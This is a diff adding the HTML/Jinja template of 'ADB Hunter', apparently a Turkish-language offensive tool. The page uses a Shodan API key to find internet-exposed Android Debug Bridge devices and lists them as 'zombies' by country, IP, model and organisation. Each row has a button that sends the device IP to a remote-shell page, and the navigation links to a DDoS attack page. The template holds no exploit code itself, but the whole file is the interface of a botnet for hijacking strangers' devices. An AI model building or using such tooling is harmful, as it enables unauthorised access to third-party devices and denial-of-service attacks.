@@ -1,0 +1,211 @@
+<!DOCTYPE HTML>
+<html>
+
+<head>
+    <link rel="icon" type="image/svg" href="{{url_for('static', filename='images/logo.svg')}}">
+    <title>ADB Hunter</title>
+
+    <script src="{{url_for('static', filename='jquery.js')}}"></script>
+    <script src="{{url_for('static', filename='popper.min.js')}}"></script>
+    <script src="{{url_for('static', filename='bootstrap.min.js')}}"></script>
+    <link rel="stylesheet" href="{{url_for('static', filename='bootstrap.min.css')}}">
+    <link rel="stylesheet" href="{{url_for('static', filename='style.css')}}">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+
+    <script>
+        function check_key() {
+            if ("{{api_key}}" == "Girilmedi!") {
+                var x = document.getElementById("alert_");
+                x.style.display = "block";
+                return;
+            }
+
+            var y = document.getElementById("all_ready");
+            y.style.display = "block";
+
+            var z = document.getElementById("zombies");
+            z.style.display = "block";
+        }
+
+        function show_error() {
+            var x = document.getElementById("error_box");
+            x.style.display = "none";
+
+            var y = document.getElementById("success_box");
+            y.style.display = "none"
+
+            x.style.display = "block";
+        }
+
+        function show_success() {
+            var x = document.getElementById("error_box");
+            x.style.display = "none";
+
+            var y = document.getElementById("success_box");
+            y.style.display = "none"
+
+            y.style.display = "block";
+        }
+
+        function redirect_to_settings() {
+            window.location.replace("/shodan/");
+        }
+
+        var getJSON = function(url, callback) {
+
+            var xhr = new XMLHttpRequest();
+            xhr.timeout = 5000;
+            xhr.open('GET', url, true);
+            xhr.responseType = 'json';
+
+            xhr.ontimeout = function (e) {
+                show_error();
+            };
+
+            xhr.onload = function() {
+                var status = xhr.status;
+
+                if (status == 200) {
+                    callback(null, xhr.response);
+                } else {
+                    callback(status);
+                }
+            };
+
+            xhr.send();
+        };
+
+        function update_zombies() {
+            getJSON('/shodan_search/', function(err, data) {
+                if (err != null) {
+                    show_error();
+                    console.error(err);
+                } else {
+                    if (data == false) {
+                      show_error();
+                      console.error(err);
+                    }
+                    for (var i = 0; i != data["matches"].length; i++) {
+                      var zombie = data["matches"][i];
+                      $("table").find('tbody').append(
+                      "<tr class=\"table-active\">" +
+                      "<th scope=\"row\">" + zombie["location"]["country_name"]+ "</th>" + 
+                      "<td>" + zombie["ip_str"] + "</td>" + 
+                      "<td>" + zombie["data"].split("\nModel: ")[1].split("\n")[0] + "</td>" + 
+                      "<td>" + zombie["org"] + "</td>" + 
+                      "<td><form action=\"/shell/\"  method=\"POST\"><input type=\"text\" id=\"ip\" name=\"ip\" value=\"" + zombie.ip_str  + "\" style=\"display:none\"><button type=\"submit\" class=\"btn btn-primary\"><i class=\"fa fa-terminal\" aria-hidden=\"true\"></i></button></form></td>" + 
+                      "</tr>");
+                    }
+                    document.getElementById("zombie_list_length").innerText = data["matches"].length.toString()
+                    show_success();
+                }
+            });
+        }
+    </script>
+
+</head>
+
+<body onload="check_key()">
+    <!-----Navbar------>
+    <nav class="navbar navbar-expand-lg navbar-dark bg-primary">
+        <a class="navbar-brand" href="/"><img class="logo" src="{{url_for('static', filename='images/logo.svg')}}"></a>
+        <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#nav_bar" aria-controls="nav_bar" aria-expanded="false" aria-label="Toggle navigation">
+            <span class="navbar-toggler-icon"></span>
+        </button>
+
+        <div class="collapse navbar-collapse" id="nav_bar">
+            <ul class="navbar-nav mr-auto">
+                <li class="nav-item">
+                    <a class="nav-link" href="/"><i class="fa fa-home" aria-hidden="true"></i>&nbsp;&nbsp;Anasayfa</a>
+                </li>
+                <li class="nav-item">
+                    <a class="nav-link" href="/shodan"><i class="fa fa-sliders" aria-hidden="true"></i>&nbsp;&nbsp;Shodan Ayarları</a>
+                </li>
+                <li class="nav-item active">
+                    <a class="nav-link" href="/zombies"><i class="fa fa-users" aria-hidden="true"></i>&nbsp;&nbsp;Zombileri Bul<span class="sr-only">(current)</span></a>
+                </li>
+                <li class="nav-item">
+                    <a class="nav-link" href="/shell"><i class="fa fa-terminal" aria-hidden="true"></i>&nbsp;&nbsp;Shell Aç</a>
+                </li>
+                <li class="nav-item">
+                    <a class="nav-link" href="/ddos"><i class="fa fa-bullseye" aria-hidden="true"></i>&nbsp;&nbsp;Saldır</a>
+                </li>
+            </ul>
+        </div>
+    </nav>
+
+    <div class="container" id="success_box" style="width: 100%; margin-top: 3%; display:none">
+        <div class="card border-secondary mb-3">
+            <div class="card-header card-header-success">Başarılı!</div>
+            <div class="card-body">
+                <h4 class="card-title">Zombi Listesi Güncellendi!</h4>
+                <p class="card-text">Artık zombileri kullanabilirsiniz!</p>
+            </div>
+        </div>
+    </div>
+
+    <div class="container" id="error_box" style="width: 100%; margin-top: 3%; display:none">
+        <div class="card border-secondary mb-3">
+            <div class="card-header card-header-danger">Hata Gerçekleşti!</div>
+            <div class="card-body">
+                <h4 class="card-title">Güncelleme yapılırken hata gerçekleşti!</h4>
+                <p class="card-text">Hata mesajını görüntülemek için konsolu ve python konsolunu kontrol edin.</p>
+            </div>
+        </div>
+    </div>
+
+    <div class="alert alert-dismissible alert-danger" id="alert_" style="display: none; margin-top: 5%; height: 26%">
+        <button type="button" class="close" data-dismiss="alert" onclick="redirect_to_settings()">&times;</button>
+        <h4 class="alert-heading">Uyarı!</h4>
+        <strong>Hata!</strong> Shodan API Anahtarı girilmemiş! Programı kullanmak için <a href="/shodan/" class="alert-link">buradan</a> anahtarınızı girebilirsiniz!
+    </div>
+
+    <div class="container" style="width: 100%; margin-top: 3%; display:none" id="all_ready">
+        <div class="card border-secondary mb-2">
+            <div class="card-header card-header-primary">Her Şey Hazır!</div>
+            <div class="card-body">
+                <h4 class="card-title text-center">Bütün ayarlamalar tamam! Aramaya başlayabiliriz.</h4>
+                <button type="button" class="btn btn-primary btn-lg btn-block" onclick="update_zombies()">Zombileri Ara!</button>
+            </div>
+        </div>
+    </div>
+
+    <div class="container" style="width: 100%; margin-top: 3%; display:none" id="zombies">
+        <div class="card border-secondary mb-2">
+            <div class="card-header card-header-primary">Zombi Listesi!</div>
+            <div class="card-body">
+                <h4 class="card-title text-center"><strong id="zombie_list_length">{{zombie_list_length}}</strong> adet zombi yüklü!</h4>
+                <table class="table table-hover" id="zombie_table">
+                    <thead>
+                        <tr class="table-primary">
+                            <th scope="col">Ülke</th>
+                            <th scope="col">IP Adresi</th>
+                            <th scope="col">Model</th>
+                            <th scope="col">Org</th>
+                            <th scope="col">Shell Aç</th>
+                        </tr>
+                    </thead>
+                    <tbody>
+                        {% for zombie in zombie_list.matches %}
+                        <tr class="table-active">
+                            <th scope="row">{{zombie["location"]["country_name"]}}</th>
+                            <td>{{zombie["ip_str"]}}</td>
+                            <td>{{zombie["data"].split("\nModel: ")[1].split("\n")[0]}}</td>
+                            <td>{{zombie["org"]}}</td>
+                            <td>
+                                <form action="/shell/"  method="POST">
+                                    <input type="text" id="ip" name="ip" value="{{zombie.ip_str}}" style="display:none">
+                                    <button type="submit" class="btn btn-primary"><i class="fa fa-terminal" aria-hidden="true"></i></button>
+                                </form>
+                            </td>
+                        </tr>
+                        {% endfor %}
+                    </tbody>
+                </table>
+            </div>
+        </div>
+    </div>
+
+</body>
+
+</html>
